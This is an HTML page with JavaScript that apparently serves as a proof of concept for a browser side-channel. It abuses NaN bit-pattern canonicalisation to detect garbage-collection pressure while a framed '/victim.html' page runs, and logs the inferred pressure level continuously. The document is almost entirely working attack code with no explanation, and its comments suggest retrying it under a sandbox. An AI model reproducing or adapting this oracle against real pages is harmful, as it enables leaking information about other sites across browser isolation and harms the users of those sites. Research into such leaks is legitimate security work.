<!doctype html>
<meta charset="utf-8">
<title>NaN Oracle – GC Side-Channel</title>

<h2>NaN Oracle – GC Detection</h2>
<pre id="log"></pre>

<!-- coba juga dengan sandbox -->
<iframe src="/victim.html"></iframe>
<!-- test tambahan -->

<script>
// ===== CORE =====
const nan = new Float64Array(new Uint8Array(8).fill(0xff).buffer)[0];

function measure({ size = 120, bsize = 40, r = Math.random() } = {}) {
  const c = new Function('nan', `
    const arr = []
    for (let i = 0; i < ${size}; i++) arr[i] = [nan]
    const r = ${r}
    if (r < 0) { ${'p();'.repeat(bsize)} }
    return arr
  `);

  const arr = c(nan);
  let res = 0;

  for (let i = 0; i < arr.length; i++) {
    const u8 = new Uint8Array(new Float64Array(arr[i]).buffer);
    if (u8[0] !== 0xff) res = i;
  }
  return res;
}

function sampleDelta() {
  const r = Math.random();
  const a = measure({ r });
  const b = measure({ r });
  return b - a;
}

// ===== SIGNAL ANALYSIS =====
let history = [];

function analyze() {
  const d = sampleDelta();
  history.push(d);
  if (history.length > 50) history.shift();

  const avg = history.reduce((a,b)=>a+b,0)/history.length;

  let state;
  if (avg < 3) state = "LOW PRESSURE";
  else if (avg < 8) state = "MEDIUM";
  else state = "HIGH PRESSURE (GC likely)";

  log(`delta=${d.toFixed(2)} avg=${avg.toFixed(2)} => ${state}`);
}

// ===== LOG =====
function log(msg) {
  document.getElementById('log').textContent += msg + "\n";
  console.log(msg);
}

// ===== LOOP =====
setInterval(analyze, 100);
</script>
